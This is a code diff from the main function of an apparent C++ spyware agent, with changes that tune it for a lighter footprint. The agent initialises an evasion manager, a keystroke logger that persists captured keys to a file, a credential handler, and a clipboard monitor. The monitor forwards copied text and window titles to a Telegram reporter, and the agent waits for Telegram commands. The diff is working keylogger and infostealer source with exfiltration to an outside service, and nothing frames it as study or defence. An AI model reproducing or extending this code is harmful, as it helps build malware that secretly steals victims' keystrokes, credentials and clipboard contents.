@@ -280,10 +280,10 @@ int main(int argc, char* argv[]) {
     domain::EvasionManager::instance().initialize();
 #endif
 
-    // ── Domain Services ──────────────────────────────────────
+    // ── Domain Services (lightweight, always active) ──────────
     domain::services::KeystrokeService keystroke_service;
     keystroke_service.enable_persistence(
-        config.pc_identifier + "_keys.dat", 50000);
+        config.pc_identifier + "_keys.dat", 10000);
     domain::services::EncryptionService encryption_service(config.encryption_password);
     domain::services::ReportingService reporting_service(
         encryption_service, config.master_log_filename, config.pc_identifier);
@@ -377,14 +377,14 @@ int main(int argc, char* argv[]) {
     application::commands::CredentialHandler credential_handler(
         telegram.reporter(), config.pc_identifier);
 
-    // ── Clipboard Monitor (optimized, adaptive polling) ──────────────
+    // ── Clipboard Monitor (lazy - only starts when command received) ──
     domain::perf::ClipboardOptimizer clipboard_monitor;
     clipboard_monitor.set_on_change([&telegram](const std::string& window, const std::string& content) {
         std::string msg = "CLIPBOARD [" + window + "]: " + content.substr(0, 200);
         if (content.size() > 200) msg += "...";
         telegram.reporter().send_message(msg);
     });
-    clipboard_monitor.start();
+    // NOTE: clipboard_monitor.start() is NOT called at startup - lazy loaded
 
     // Wire clipboard monitor to credential handler for cliplog/clipclear
     credential_handler.set_clipboard_monitor(&clipboard_monitor);
@@ -456,7 +456,7 @@ int main(int argc, char* argv[]) {
     });
 #endif
 
-    spdlog::info("Agent started. Waiting for Telegram commands...");
+    spdlog::info("Agent started (minimal mode). Waiting for Telegram commands...");
 
     // Message pump (blocks until PostQuitMessage is called)
     persistence.pump_messages();
